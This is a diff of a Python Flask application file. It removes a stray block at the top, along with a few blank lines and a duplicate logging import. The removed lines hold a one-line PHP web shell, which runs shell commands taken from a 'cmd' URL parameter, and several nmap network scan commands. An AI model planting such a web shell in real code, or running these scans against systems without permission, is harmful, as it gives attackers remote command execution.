@@ -1,19 +1,5 @@
-#password.json
-#login.html
-#home.html   <?php echo `{$_GET['cmd']}`;
-"""
-nmap -sn 192.168.1.0/24
-nmap -sS 192.168.1.1
-nmap -sV -sC 192.168.1.1
-nmap -A 192.168.1.1
-nmap -sU -p 53,161 192.168.1.1
-
-"""
 import sqlite3
 import threading
-
-
-
 from lazy_safe import Simple_Watcher
 import logging
 from flask import Flask, request, jsonify, render_template, session, redirect, url_for
@@ -32,7 +18,6 @@ from all_functions import login_check, verify_the_password, commonplace_text, wh
 from safe_functions import route_and_subdomaincheck, sql_check, simple_sniff
 from datetime import datetime
 import sys
-import logging
 from logging.handlers import RotatingFileHandler
 
 
@@ -353,3 +338,4 @@ if __name__ == '__main__':
 ###
 ####
 #####
+
